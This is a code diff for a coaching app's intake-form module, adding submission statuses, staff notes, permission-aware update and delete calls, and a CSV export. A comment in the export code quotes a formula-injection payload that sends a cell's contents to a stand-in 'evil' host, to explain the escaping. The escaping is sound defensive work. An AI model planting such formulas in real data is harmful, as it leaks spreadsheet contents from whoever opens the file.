@@ -17,11 +17,19 @@
  * Nothing throws. Every failure is a value, because every caller is a screen or
  * a public form that has to say something.
  *
- * Supabase migration: supabase/migrations/024_forms.sql
+ * 043 gave a submission a working life — a status, staff notes and an updated_at
+ * — so the second half of this file is the response MANAGER: one list across
+ * every form the reader may see, two column-scoped writes, and a pure CSV.
+ *
+ * Supabase migrations: supabase/migrations/024_forms.sql
+ *                      supabase/migrations/040_submission_management.sql
  */
 
-import { supabase, supabaseConfigured } from './supabase'
-import { sanitizeText, sanitizeShort, sanitizeEmail, isValidEmail, clampInt } from '../utils/sanitize'
+import { supabase, supabaseConfigured } from './supabase.ts'
+import { sanitizeText, sanitizeShort, sanitizeEmail, isValidEmail, clampInt } from '../utils/sanitize.ts'
+import type { WriteResult } from '../types/messaging.ts'
+
+export type { WriteResult }
 
 // ── Types ───────────────────────────────────────────────────────────────────
 
@@ -64,6 +72,21 @@ export interface IntakeForm {
   updatedAt: string
 }
 
+/** Alias for the contract T2's manager imports against. Same row, one name. */
+export type IntakeFormRow = IntakeForm
+
+/**
+ * Where a response is in the queue. Exactly the three 043's check constraint
+ * accepts, so a value that passes through here cannot come back as a 23514.
+ */
+export type SubmissionStatus = 'new' | 'reviewed' | 'archived'
+
+export const SUBMISSION_STATUSES: SubmissionStatus[] = ['new', 'reviewed', 'archived']
+
+export function isSubmissionStatus(v: unknown): v is SubmissionStatus {
+  return typeof v === 'string' && (SUBMISSION_STATUSES as string[]).includes(v)
+}
+
 export interface FormSubmission {
   id: string
   formId: string
@@ -72,6 +95,43 @@ export interface FormSubmission {
   clientEmail: string | null
   answers: Record<string, unknown>
   submittedAt: string
+  /** 043. Staff-set; the submitter can read it and cannot change it. */
+  status: SubmissionStatus
+  /** 043. NOT private from the submitter — see the migration's essay. */
+  staffNotes: string | null
+  /** 043. Equal to submittedAt until a staff member works the response. */
+  updatedAt: string
+}
+
+/**
+ * A submission as the MANAGER sees it: raw columns, snake_case, the shape the
+ * table has.
+ *
+ * Two shapes for one row is a real cost, so here is why it is worth paying.
+ * `FormSubmission` is the per-form, per-athlete view the public flow and the
+ * form builder have always used, and it is camelCase because nothing in those
+ * screens is column-shaped. The manager is column-shaped end to end: it writes
+ * to two named columns, filters on a third, and exports the lot to a CSV whose
+ * headers ARE the columns. Renaming everything on the way in and back out again
+ * would buy nothing but a place for the two spellings to drift.
+ */
+export interface SubmissionRow {
+  id: string
+  form_id: string
+  /** null = a guest submitted signed-out. */
+  client_id: string | null
+  client_email: string | null
+  answers: Record<string, unknown>
+  status: SubmissionStatus
+  staff_notes: string | null
+  submitted_at: string
+  updated_at: string
+}
+
+/** What a manager screen may change. Anything absent is left alone. */
+export interface SubmissionPatch {
+  status?: SubmissionStatus
+  staffNotes?: string | null
 }
 
 /** Draft shape the builder saves. `id` present = update, absent = create. */
@@ -97,7 +157,22 @@ export type SubmitResult =
 const FORM_COLUMNS =
   'id,coach_slug,title,description,is_active,fields,created_by,created_at,updated_at'
 const SUBMISSION_COLUMNS =
-  'id,form_id,client_id,client_email,answers,submitted_at'
+  'id,form_id,client_id,client_email,answers,submitted_at,status,staff_notes,updated_at'
+
+/** The most rows a manager screen asks for in one go. */
+const SUBMISSION_LIMIT = 1000
+
+/** 043's own cap, mirrored so a long note is trimmed rather than 23514'd. */
+const NOTES_MAX = 4000
+
+/**
+ * The one spelling of a stored staff note. Exported so the panel can show the
+ * exact value the table now holds after a save, instead of echoing a draft the
+ * sanitizer quietly shortened.
+ */
+export function cleanStaffNotes(raw: unknown): string | null {
+  return sanitizeText(String(raw ?? ''), NOTES_MAX).trim() || null
+}
 
 // ── Field validation / normalisation ────────────────────────────────────────
 
@@ -189,17 +264,64 @@ function rowToForm(row: Record<string, unknown>): IntakeForm {
   }
 }
 
-function rowToSubmission(row: Record<string, unknown>): FormSubmission {
-  const answers = (row.answers && typeof row.answers === 'object')
-    ? row.answers as Record<string, unknown>
+function asAnswers(raw: unknown): Record<string, unknown> {
+  return (raw && typeof raw === 'object' && !Array.isArray(raw))
+    ? raw as Record<string, unknown>
     : {}
+}
+
+/**
+ * A status the screen can switch on. Anything unrecognised reads as 'new' rather
+ * than as itself: 043's check constraint means an off-list value cannot be in
+ * the column, so the only way to get here is a row written before that migration
+ * landed, and "nobody has worked this yet" is the right thing to say about one.
+ */
+function asStatus(raw: unknown): SubmissionStatus {
+  return isSubmissionStatus(raw) ? raw : 'new'
+}
+
+function rowToSubmission(row: Record<string, unknown>): FormSubmission {
+  const submittedAt = String(row.submitted_at ?? '')
   return {
     id: String(row.id),
     formId: String(row.form_id),
     clientId: (row.client_id as string | null) ?? null,
     clientEmail: (row.client_email as string | null) ?? null,
-    answers,
-    submittedAt: String(row.submitted_at ?? ''),
+    answers: asAnswers(row.answers),
+    submittedAt,
+    status: asStatus(row.status),
+    staffNotes: (row.staff_notes as string | null) ?? null,
+    updatedAt: String(row.updated_at ?? submittedAt),
+  }
+}
+
+function rowToSubmissionRow(row: Record<string, unknown>): SubmissionRow {
+  const submitted_at = String(row.submitted_at ?? '')
+  return {
+    id: String(row.id),
+    form_id: String(row.form_id),
+    client_id: (row.client_id as string | null) ?? null,
+    client_email: (row.client_email as string | null) ?? null,
+    answers: asAnswers(row.answers),
+    status: asStatus(row.status),
+    staff_notes: (row.staff_notes as string | null) ?? null,
+    submitted_at,
+    updated_at: String(row.updated_at ?? submitted_at),
+  }
+}
+
+/** The demo store keeps one shape; the manager asks for the other. */
+function toSubmissionRow(s: FormSubmission): SubmissionRow {
+  return {
+    id: s.id,
+    form_id: s.formId,
+    client_id: s.clientId,
+    client_email: s.clientEmail,
+    answers: { ...s.answers },
+    status: s.status,
+    staff_notes: s.staffNotes,
+    submitted_at: s.submittedAt,
+    updated_at: s.updatedAt,
   }
 }
 
@@ -245,6 +367,28 @@ const DEMO_FORMS: IntakeForm[] = [
   },
 ]
 
+/**
+ * `daysAgo` days before now, at a fixed hour.
+ *
+ * The forms above carry fixed dates because "this form was built a while back"
+ * ages gracefully. Submissions cannot: the manager counts what arrived this week
+ * and filters on a date range, and a demo where every response is four months
+ * old shows a zero and an empty list. Same idiom userManagement's demo people
+ * use, for the same reason.
+ */
+function demoIso(daysAgo: number, hour = 15): string {
+  const d = new Date()
+  d.setUTCDate(d.getUTCDate() - daysAgo)
+  d.setUTCHours(hour, 0, 0, 0)
+  return d.toISOString()
+}
+
+/**
+ * Six responses across the two demo forms, deliberately mixed: guests and
+ * signed-in members, all three statuses, some annotated and some not, spread
+ * from yesterday to five weeks back. Every filter, stat and empty state on the
+ * manager has something to bite on without a database.
+ */
 const DEMO_SUBMISSIONS: FormSubmission[] = [
   {
     id: 'demo-sub-1',
@@ -261,7 +405,10 @@ const DEMO_SUBMISSIONS: FormSubmission[] = [
       training_days: 4,
       consent: true,
     },
-    submittedAt: '2026-08-05T17:20:00.000Z',
+    submittedAt: demoIso(1, 17),
+    status: 'new',
+    staffNotes: null,
+    updatedAt: demoIso(1, 17),
   },
   {
     id: 'demo-sub-2',
@@ -275,7 +422,85 @@ const DEMO_SUBMISSIONS: FormSubmission[] = [
       next_meet: 'USAPL state in November',
       weak_point: 'Bench',
     },
-    submittedAt: '2026-08-09T15:05:00.000Z',
+    submittedAt: demoIso(3),
+    status: 'new',
+    staffNotes: null,
+    updatedAt: demoIso(3),
+  },
+  {
+    id: 'demo-sub-3',
+    formId: 'demo-form-general',
+    clientId: 'demo-devin',
+    clientEmail: 'devin.cross@gmail.com',
+    answers: {
+      full_name: 'Devin Cross',
+      email: 'devin.cross@gmail.com',
+      phone: '(559) 555-0177',
+      goals: 'Come back from a long layoff without wrecking my shoulder again.',
+      experience: '4 or more years',
+      injuries: 'Right shoulder impingement, cleared by physio in June.',
+      training_days: 3,
+      consent: true,
+    },
+    submittedAt: demoIso(6, 9),
+    status: 'reviewed',
+    staffNotes: 'Called Devin. Starting him with Seth on a three day upper/lower, no overhead pressing for four weeks.',
+    updatedAt: demoIso(5, 11),
+  },
+  {
+    id: 'demo-sub-4',
+    formId: 'demo-form-general',
+    clientId: 'demo-marcus',
+    clientEmail: 'marcus.r@gmail.com',
+    answers: {
+      full_name: 'Marcus Rivera',
+      email: 'marcus.r@gmail.com',
+      goals: 'Put on size. I have never followed a real program.',
+      experience: 'Less than 1 year',
+      training_days: 5,
+      consent: true,
+    },
+    submittedAt: demoIso(11, 20),
+    status: 'new',
+    staffNotes: null,
+    updatedAt: demoIso(11, 20),
+  },
+  {
+    id: 'demo-sub-5',
+    formId: 'demo-form-ronnie',
+    clientId: 'demo-bianca',
+    clientEmail: 'bianca.reyes@gmail.com',
+    answers: {
+      full_name: 'Bianca Reyes',
+      email: 'bianca.reyes@gmail.com',
+      best_total: 905,
+      next_meet: 'Nothing booked yet',
+      weak_point: 'Squat',
+    },
+    submittedAt: demoIso(24, 13),
+    status: 'archived',
+    staffNotes: 'Moved to Lucas after the first call. Filed here so the handover is on the record.',
+    updatedAt: demoIso(22, 8),
+  },
+  {
+    id: 'demo-sub-6',
+    formId: 'demo-form-general',
+    clientId: null,
+    clientEmail: 'priya.nair@example.com',
+    answers: {
+      full_name: 'Priya Nair',
+      email: 'priya.nair@example.com',
+      phone: '(559) 555-0165',
+      goals: 'General strength, two mornings a week, nothing competitive.',
+      experience: '2 to 4 years',
+      injuries: '',
+      training_days: 2,
+      consent: true,
+    },
+    submittedAt: demoIso(35, 7),
+    status: 'reviewed',
+    staffNotes: 'Sent the two-day template and the schedule. No reply yet.',
+    updatedAt: demoIso(33, 16),
   },
 ]
 
@@ -362,6 +587,42 @@ export async function fetchSubmissions(formId: string, isDemo: boolean): Promise
 
   if (error) return null
   return (data ?? []).map(r => rowToSubmission(r as Record<string, unknown>))
+}
+
+/**
+ * Every submission the reader may see, across every form, newest first.
+ *
+ * The manager's one read. There is no form filter and no status filter in the
+ * query on purpose: the screen holds a thousand rows at most, filters them in
+ * the browser, and exports whatever is on screen — a round trip per pill press
+ * would be slower and would make the CSV disagree with the list.
+ *
+ * WHICH rows come back is not this function's business. 024's read policy
+ * decides it: an admin and a `view_form_submissions` holder see everything, a
+ * coach sees responses to their own form, and an athlete would see only their
+ * own — which is why the manager is behind a staff route rather than why this
+ * query is shaped the way it is.
+ *
+ * Null is an outage, kept distinct from an empty list so a failed read never
+ * renders as "no responses yet".
+ */
+export async function fetchAllSubmissions(isDemo = false): Promise<SubmissionRow[] | null> {
+  if (!supabaseConfigured || isDemo) {
+    return demoSubs()
+      .slice()
+      .sort((a, b) => b.submittedAt.localeCompare(a.submittedAt))
+      .slice(0, SUBMISSION_LIMIT)
+      .map(toSubmissionRow)
+  }
+
+  const { data, error } = await supabase
+    .from('form_submissions')
+    .select(SUBMISSION_COLUMNS)
+    .order('submitted_at', { ascending: false })
+    .limit(SUBMISSION_LIMIT)
+
+  if (error) return null
+  return (data ?? []).map(r => rowToSubmissionRow(r as Record<string, unknown>))
 }
 
 // ── Writes ───────────────────────────────────────────────────────────────────
@@ -469,10 +730,14 @@ export async function submitForm(
   if (email && !isValidEmail(email)) return { ok: false, message: 'Enter a valid email address.' }
 
   if (!supabaseConfigured || isDemo) {
+    const now = new Date().toISOString()
     demoSubs().unshift({
       id: `demo-sub-${Math.random().toString(36).slice(2, 10)}`,
       formId, clientId: null, clientEmail: email || null, answers,
-      submittedAt: new Date().toISOString(),
+      submittedAt: now,
+      // What 043's defaults would have made it: brand new, unworked, and
+      // updated_at equal to submitted_at until somebody touches it.
+      status: 'new', staffNotes: null, updatedAt: now,
     })
     return { ok: true }
   }
@@ -523,6 +788,197 @@ function cleanAnswers(fields: FormField[], raw: Record<string, unknown>): Record
     }
   }
   return out
+}
+
+// ── Working a response (043) ─────────────────────────────────────────────────
+
+/**
+ * The two refusals a manager screen can actually hit, as sentences.
+ *
+ * Both arrive as ZERO ROWS rather than as errors, because that is what an RLS
+ * policy that does not match looks like from PostgREST. Every write below asks
+ * for `.select('id')` back for exactly that reason — a screen that reads an
+ * empty result as success shows a status the database never agreed to.
+ */
+const UPDATE_REFUSED =
+  'That response was not updated. It may have been deleted, or working responses '
+  + 'to that form may need an admin, the See form submissions permission, or the '
+  + 'coach who owns it.'
+
+// Deleting needs the delete tier AND the ability to read the row: 043's policy
+// names admin-or-manage_forms, and Postgres applies the read policy too because
+// this call carries a RETURNING clause. The sentence names both halves so the
+// person reading it knows what to ask for.
+const DELETE_REFUSED =
+  'That response was not deleted. It may already be gone, or deleting one may need '
+  + 'an admin, or both the Manage intake forms and See form submissions permissions.'
+
+/** A PostgREST error on one of these writes, turned into something actionable. */
+function submissionError(error: { message?: string; code?: string } | null, fallback: string): string {
+  if (!error) return fallback
+  const code = error.code ?? ''
+  const msg = (error.message ?? '').replace(/^ERROR:\s*/i, '').trim()
+
+  if ((code === 'P0001' || code === '22023') && msg) return msg
+  if (code === '23514') return 'That does not fit. A note caps at 4000 characters.'
+  if (code === '42501' || /row-level security|permission denied/i.test(msg)) {
+    return 'The database refused that change. Your account may not have permission any more. Sign out, sign back in, and try again.'
+  }
+  if (code === 'PGRST301' || /jwt|token is expired/i.test(msg)) {
+    return 'Your session expired. Sign in again and the change will go through.'
+  }
+  if (/failed to fetch|networkerror|load failed/i.test(msg)) {
+    return 'Could not reach the server. Check your connection. Nothing was changed.'
+  }
+  return fallback
+}
+
+/**
+ * Move a response through the queue, and write down what was decided.
+ *
+ * Two columns and only two, because that is the entire update grant 043 hands
+ * out: `status` and `staff_notes`. Everything that makes a submission evidence —
+ * the answers, the email, who filed it, when — is outside the grant, so this
+ * function has nothing to defend and no way to overreach.
+ *
+ * An absent key is left alone; `staffNotes: null` clears the note. A patch with
+ * neither key is a no-op and says so by succeeding, rather than by sending
+ * PostgREST an empty body it would reject.
+ *
+ * A CLIENT CANNOT REACH THIS, and that is the point of 043. They may read their
+ * own submission back and the update policy still does not include them, so the
+ * write matches nothing and comes home as the refusal sentence above.
+ */
+export async function updateSubmission(
+  id: string,
+  patch: SubmissionPatch,
+  isDemo = false,
+): Promise<WriteResult> {
+  const wantsStatus = patch.status !== undefined
+  const wantsNotes = patch.staffNotes !== undefined
+
+  if (wantsStatus && !isSubmissionStatus(patch.status)) {
+    return { ok: false, message: 'A response can only be new, reviewed or archived.' }
+  }
+
+  const notes = wantsNotes ? cleanStaffNotes(patch.staffNotes) : undefined
+
+  if (!wantsStatus && !wantsNotes) return { ok: true }
+
+  if (!supabaseConfigured || isDemo) {
+    const row = demoSubs().find(s => s.id === id)
+    if (!row) return { ok: false, message: UPDATE_REFUSED }
+    if (wantsStatus) row.status = patch.status as SubmissionStatus
+    if (wantsNotes) row.staffNotes = notes ?? null
+    row.updatedAt = new Date().toISOString()
+    return { ok: true }
+  }
+
+  const changes: Record<string, unknown> = {}
+  if (wantsStatus) changes.status = patch.status
+  if (wantsNotes) changes.staff_notes = notes
+
+  const { data, error } = await supabase
+    .from('form_submissions')
+    .update(changes)
+    .eq('id', id)
+    .select('id')
+
+  if (error) return { ok: false, message: submissionError(error, 'That response was not updated.') }
+  if (!data || data.length === 0) return { ok: false, message: UPDATE_REFUSED }
+  return { ok: true }
+}
+
+/**
+ * Destroy a response.
+ *
+ * The narrowest thing in this file, and 043 keeps it that way: the admin or a
+ * `manage_forms` holder, where working the queue is open to the owning coach and
+ * to anyone with `view_form_submissions`. Archiving is how a response gets out
+ * of the way; this is for the test submissions and the junk.
+ *
+ * It does not touch the form. 024 still blocks deleting a form anyone has
+ * answered, and still freezes its questions.
+ */
+export async function deleteSubmission(id: string, isDemo = false): Promise<WriteResult> {
+  if (!supabaseConfigured || isDemo) {
+    const store = demoSubs()
+    const index = store.findIndex(s => s.id === id)
+    if (index === -1) return { ok: false, message: 'That response is already gone. Refresh the list.' }
+    store.splice(index, 1)
+    return { ok: true }
+  }
+
+  const { data, error } = await supabase
+    .from('form_submissions')
+    .delete()
+    .eq('id', id)
+    .select('id')
+
+  if (error) return { ok: false, message: submissionError(error, 'That response was not deleted.') }
+  if (!data || data.length === 0) return { ok: false, message: DELETE_REFUSED }
+  return { ok: true }
+}
+
+// ── Export ───────────────────────────────────────────────────────────────────
+
+/**
+ * One CSV cell, escaped for both the file format and the thing that opens it.
+ *
+ * A copy of newsletterApi's `csvCell`, which is module-private there and is not
+ * this file's to export from. Both problems it solves are worth restating: a
+ * value containing a double quote ends its own field and shifts every column
+ * after it, and CSV escapes a quote by doubling it; and a value STARTING with
+ * `=`, `+`, `-` or `@` is a FORMULA to Excel and Sheets, so an athlete who
+ * types `=HYPERLINK("http://evil/"&A1,"click")` into a free-text answer gets
+ * that executed on a coach's machine when they open the export. The leading
+ * apostrophe makes the spreadsheet treat it as the text it always was.
+ *
+ * Answers reach this via JSON.stringify, so the value can contain quotes,
+ * commas and newlines. All three are legal inside a quoted field.
+ */
+function csvCell(value: string): string {
+  const raw = String(value ?? '')
+  const escaped = /^[=+\-@\t\r]/.test(raw) ? `'${raw}` : raw
+  return `"${escaped.replace(/"/g, '""')}"`
+}
+
+/**
+ * The filtered response list as a CSV, as a string.
+ *
+ * PURE, deliberately: it takes rows and forms and returns text, touching no
+ * Blob, no document and no clock. The screen decides WHICH rows (whatever the
+ * filters left on screen) and what to do with the text; this decides what a
+ * response looks like as a line. That is also what makes the escaping above
+ * testable, which is the half of a CSV export that can actually hurt somebody.
+ *
+ * Six columns. `submitted_at` goes out as the stored ISO timestamp rather than a
+ * formatted date: a spreadsheet sorts it correctly, it does not depend on the
+ * exporter's locale, and no information is thrown away. The answers ride in one
+ * JSON column because the forms in a cross-form export do not share questions —
+ * a column per key would be a sparse matrix a hundred wide.
+ */
+export function submissionsToCsv(rows: SubmissionRow[], forms: IntakeFormRow[]): string {
+  const titles = new Map<string, string>()
+  for (const f of forms ?? []) titles.set(f.id, f.title)
+
+  const header = ['Submitted', 'Form', 'Email', 'Submitter', 'Status', 'Answers']
+    .map(csvCell)
+    .join(',')
+
+  const lines = (rows ?? []).map(r => [
+    csvCell(r.submitted_at),
+    // A form the reader cannot see is not a deleted form: 024 cascades a form's
+    // submissions away with it, so an id with no title here means the form was
+    // outside the fetch, not that it is gone.
+    csvCell(titles.get(r.form_id) ?? 'Unknown form'),
+    csvCell(r.client_email ?? ''),
+    csvCell(r.client_id ? 'Member' : 'Guest'),
+    csvCell(r.status),
+    csvCell(JSON.stringify(r.answers ?? {})),
+  ].join(','))
+
+  return [header, ...lines].join('\n')
 }
 
 /** For the demo/reset seam and tests. */
